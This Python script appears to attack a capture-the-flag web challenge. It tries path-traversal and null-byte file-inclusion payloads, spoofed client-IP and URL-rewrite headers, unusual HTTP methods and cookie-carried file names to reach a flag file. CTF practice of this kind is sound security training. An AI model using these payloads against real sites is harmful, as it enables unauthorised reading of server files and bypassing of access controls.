# -*- coding: utf-8 -*-
"""最后冲刺：LFI 变体 + HTTP 头注入"""
import requests

base = 'http://29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com:80'

def probe(label, method='GET', path='/', params=None, data=None, headers=None, cookies=None):
    try:
        r = requests.request(method, base + path, params=params, data=data,
                             headers=headers or {}, cookies=cookies or {}, timeout=12)
        L = len(r.text)
        if 'checkFile' in r.text:
            result = 'include source.php!'
        elif 'flag not here' in r.text:
            result = 'include hint.php!'
        elif 'you can\'t see it' in r.text:
            result = '失败'
        elif 'FLAG' in r.text or 'flag' in r.text.lower() and 'flag not here' not in r.text:
            result = f'!!! FLAG?: {r.text[:80]}'
        elif L != 354 and 'DOCTYPE' in r.text and L < 500:
            result = f'页面变化({L})'
        else:
            result = f'其他({L})'
        print(f'{label:<34} -> {r.status_code} {result}')
        return r
    except Exception as e:
        print(f'{label:<34} -> 异常: {str(e)[:50]}')
        return None


print('=== A. LFI 变体 ===')
probe('null byte: source.php%00../flag', params={'file': 'source.php%00../../ffffllllaaaagggg.php'})
probe('路径: source.php/../flag', params={'file': 'source.php/../../ffffllllaaaagggg.php'})
probe('hint.php/../flag', params={'file': 'hint.php/../../ffffllllaaaagggg.php'})
probe('大小写 SOURCE.PHP?x', params={'file': 'SOURCE.PHP?x'})
probe('./source.php?x', params={'file': './source.php?x'})

print()
print('=== B. HTTP 头注入（http-ctf2 题目名）===')
probe('XFF 127.0.0.1', headers={'X-Forwarded-For': '127.0.0.1'})
probe('Client-IP 127.0.0.1', headers={'Client-IP': '127.0.0.1'})
probe('X-Real-IP 127.0.0.1', headers={'X-Real-IP': '127.0.0.1'})
probe('X-Original-URL /admin', headers={'X-Original-URL': '/admin'})
probe('X-Rewrite-URL /admin', headers={'X-Rewrite-URL': '/admin'})
probe('Host: 127.0.0.1', headers={'Host': '127.0.0.1'})

print()
print('=== C. 其他方法 ===')
probe('OPTIONS /', method='OPTIONS')
probe('TRACE /', method='TRACE')
probe('PUT /?file=source.php', method='PUT')

print()
print('=== D. Cookie 传 file ===')
probe('Cookie file=flag', cookies={'file': 'ffffllllaaaagggg.php'})
probe('Cookie file=source.php', cookies={'file': 'source.php'})
